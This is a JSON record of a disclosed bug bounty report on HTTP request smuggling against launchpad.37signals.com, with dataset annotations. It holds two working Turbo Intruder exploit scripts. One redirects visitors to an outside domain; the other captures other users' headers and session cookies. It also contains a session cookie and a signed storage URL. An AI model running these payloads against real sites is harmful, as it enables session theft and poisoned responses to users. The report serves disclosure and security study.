{
    "reported_to": "Basecamp",
    "reported_by": "hazimaslam ",
    "title": "Unauthenticated request smuggling on launchpad.37signals.com",
    "content": "\nDescription\nBy sending an ambiguous request on the rails application on launchpad.37signals.com, an attacker can desynchronise frontend and backend servers, leaving the socket to the backend server poisoned with a harmful response. This response will then be served up to the next visitor.\nThe desync occurs when sending a request with a Content-Length header and a valid Transfer-Encoding header followed by an invalid Transfer-Encoding header. The frontend server only examines the second Transfer-Encoding which is invalid, so it uses the Content-Length instead. However the backend server prioritises the valid Transfer-Encoding header and therefore ignores the Content-Length.\nValidation Steps\nTo replicate this bug, run the following script in Turbo Intruder. After issuing a desync request, it simulates 6 requests from normal visitors one of which gets redirected to hazimaslam.com.\nCode 1.67 KiB\n1def queueRequests(target, wordlists):\n2\n3    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',\n4                           concurrentConnections=3,\n5                           requestsPerConnection=2,\n6                           resumeSSL=False,\n7                           timeout=10,\n8                           pipeline=False,\n9                           maxRetriesPerRequest=0,\n10                           engine=Engine.THREADED,\n11                           )\n12\n13    attack = '''POST /identity HTTP/1.1\n14Host: launchpad.37signals.com\n15Content-Length: 69\n16Connection: keep-alive\n17Content-Type: application/x-www-form-urlencoded\n18Transfer-Encoding: chunked\n19Transfer-Encoding: foo\n20\n213\n22x=1\n230\n24\n25GET / HTTP/1.1\n26X-Forwarded-Host: hazimaslam.com\n27Foo: bar'''\n28\n29    engine.queue(attack)\n30\n31    victim = '''GET /signin HTTP/1.1\n32Host: launchpad.37signals.com\n33Connection: close\n34Upgrade-Insecure-Requests: 1\n35User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\n36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n37Accept-Encoding: gzip, deflate\n38Accept-Language: en-US,en;q=0.9,la;q=0.8\n39Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D\n40\n41'''\n42    for i in range(6):\n43        engine.queue(victim)\n44        time.sleep(0.05)\n45\n46\n47def handleResponse(req, interesting):\n48    table.add(req)\n<image_0>\nCapturing and storing normal visitors' request headers and cookies\nBy prefixing the victim's request with a crafted storage request, we can make the application save their request and display it back to us and steal any authentication cookies/headers.\nLogin and visit https://launchpad.37signals.com/identity/edit\nSave changes and intercept the request.\nCopy the values of following from intercepted request and paste in the script where indicated:\nidentity_id (cookie)\nsession_token (cookie)\n_launchpad_session (cookie)\nauthenticity_token (parameter)\nCode 1.70 KiB\n1def queueRequests(target, wordlists):\n2\n3    engine = RequestEngine(endpoint='https://launchpad.37signals.com:443',\n4                           concurrentConnections=3,\n5                           requestsPerConnection=2,\n6                           resumeSSL=False,\n7                           timeout=10,\n8                           pipeline=False,\n9                           maxRetriesPerRequest=0,\n10                           engine=Engine.THREADED,\n11                           )\n12\n13    attack = '''POST /identity HTTP/1.1\n14Host: launchpad.37signals.com\n15Content-Length: 903\n16Connection: keep-alive\n17Content-Type: application/x-www-form-urlencoded\n18Transfer-Encoding: chunked\n19Transfer-Encoding: foo\n20\n213\n22x=1\n230\n24\n25POST /identity HTTP/1.1\n26Host: launchpad.37signals.com\n27Content-Length: 435\n28X-Forwarded-Proto: https\n29Content-Type: application/x-www-form-urlencoded\n30Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE\n31\n32_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d='''\n33\n34    engine.queue(attack)\n35\n36    victim = '''GET /signin HTTP/1.1\n37Host: launchpad.37signals.com\n38User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36\n39Cookie: _launchpad_session=uViarUZn10afBS9AD4AgD9lF4iEk6%2FIfinxiAVgiEQNq2xMTKY86i9r%2FZEQ%2BENl183aEL845OspHItodYdrC0OIEWMzEjswGng%2F%2BXwE5nsYBhY7ep%2B%2FmrDB1ZXa%2B1NaAji52own5luVsggkP98GrqNjnWHxGdIfffZjMFwz3Q3fNxV0NilS1DmNiY0P72x9CDsrQfzc0HbGfnL%2BEvs9%2BODfbfJYnexsrxX2P78RaQ8wf--0zL8fFbFTz6maAwm--XxtVi%2BPuHcoHD8hjqSkxkQ%3D%3D\n40Foo: bar\n41\n42'''\n43    for i in range(6):\n44        engine.queue(victim)\n45        time.sleep(0.05)\n46\n47\n48def handleResponse(req, interesting):\n49    table.add(req)\nRun the script in Turbo Intruder and refresh https://launchpad.37signals.com/identity/edit to see captured headers and cookies.\nHere is the video demonstration for this:\nImpact\nWith request smuggling, attacker can serve harmful response to random people actively browsing the website, enabling straightforward mass-exploitation.\nBy redirecting javascript imports to a malicious domain, an attacker can inject a key-logger and steal user passwords from login page.\nIt is also possible to capture visitors' request headers and cookies.\nNo authentication and interaction required.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "HTTP Request Smuggling"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xVhyTaWBQMyL425A8E5i4oRA?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-05-07_at_7.51.16_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-05-07_at_7.51.16_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7ZJYMYW5%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T223006Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIHEtprC56zaUG2%2FRQnJQU1AahNVwinnmCjz0AMvEoLsJAiAtalDhcF3yKdYS%2Bb1p8vvhihOuEKKMZPrP9cZEXC3ZpSqyBQgeEAMaDDAxMzYxOTI3NDg0OSIMOxvIuAztr0KG0YJwKo8F99h1YUQQcm2FE6WzHuEqtut56cvYoqSEi3cDXPxVrNiau8f2FYc%2BGVh2pPFTLKTWq%2Fj9iBMNwaq2umeN3jG1S2EV67bK2tEUv%2BTtWtrCMzQI53hrD9RZSJ54R%2BwxqyV%2FsD0VCEQfjCmxonnWej7%2BD6VYaVi0YZOJAwNX5PAcDSg99s7wgPnrGHkfizmBvpvc0J6tZmQMe0FO%2FsO%2FOr4b8WMTLITP93YwuKfT8lIKhx9QlLUnDmgzanjtBG%2BOwDOBlVrGLQUA717L6fPSpfPVellRn3oOtlutzwdgJ3SJK%2BFtx4zKRPhyPI4wfo0MPaf2QDDVlK1NIvP3f1KildXYEtiPXyAGlwqMxm8tox397UvQqriUNCUY%2BQT0cuvxiJNx7qawK%2FhWr52PoDZBnHEgOMp%2F0So6e2ZK77%2BsfVHx%2FL1naxQZjbNE%2BJB35ADm9FSxGnat5OW1Ji715LXd3xB4zrbga5cIckAfHehUkFQkbqKPjib7swUSMa3J3HnO2gyFgpagMJT8GNc4yYUVc8p8lpZb%2BlvjPd4O98aeVtKDOdmJ2YuiA%2B9qcHVy7rh6iNwYYeLneIenOFNG%2FiQi1fgJNxEop5QW3r7U08KWWhYbzQgsZyzOwHg41m9r2iYmU%2Fave%2BiPmpK3t5Qyhm1c9qPxo4M%2FH2HWhAgQMUlkwWrmd8jcIbK%2F9qsRlmwnXi9a1yi7msI2PoFIai04bTpQB3s5yMjxumH5hJ6oBlTDHVqMMRonaHWlH3XBEWizIg1Tl4cBCnRg3yC76ayBTft2vb3xYqWKTZ5d11UZYCSD5W%2Ftw2XvkwcHAlN6ei6bKxPx9rAIjGd6R4%2Fe1FpV4o8r3JkutsNv7D4qGeUZPnsgCO6gnjC%2BtYy%2FBjqyASN16RTKYay%2FwLUU9mPD2YYiV%2F6FCO4IfRUuBmbxOTqOFynX7rTVbCya622jgE8c%2FnRr5QSvkGhqZbU8DxKHWqNL9YFhm8Z2ygZhdwZ9jrOnc0xajDHRFlniTLW%2FMiEvLUOcXkj7rjkUl4ialh%2B0vmGphL66I%2FiMHlbx9laqjEldVMubzZPVSeBzvOd8z5FzQGxL61EakDASTVnd5UzDSzq2YfpItACnyq6a899PD1rYcWY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a917e8e587720b235eb013ecbb3bcb504af81fb7dde9e5ab3a5ddc5653a453c6"
    },
    "disclosed_date": 1603911420,
    "report_url": "https://hackerone.com/reports/867577",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Craft a malicious HTTP request with conflicting Content-Length and Transfer-Encoding headers to cause request smuggling."
        ],
        [
            2,
            "Send the crafted request to launchpad.37signals.com to desynchronize frontend and backend servers."
        ],
        [
            3,
            "Simulate normal visitor requests to observe the poisoned response being served to an innocent user."
        ],
        [
            4,
            "Optionally, capture and store visitors' request headers and cookies by prefixing victim requests with a crafted storage request."
        ]
    ],
    "vuln_description": "An unauthenticated request smuggling vulnerability on launchpad.37signals.com allows an attacker to desynchronize frontend and backend servers by sending ambiguous requests with conflicting Content-Length and Transfer-Encoding headers. This can lead to harmful responses being served to other users, enabling attacks like redirection to malicious domains or capturing sensitive information.",
    "reason": "This vulnerability requires understanding of HTTP request smuggling techniques, specifically the subtle interaction between Content-Length and Transfer-Encoding headers when multiple headers are present. The attacker must also understand how to craft requests that will be interpreted differently by frontend and backend servers, and how to exploit this desynchronization to impact other users.",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}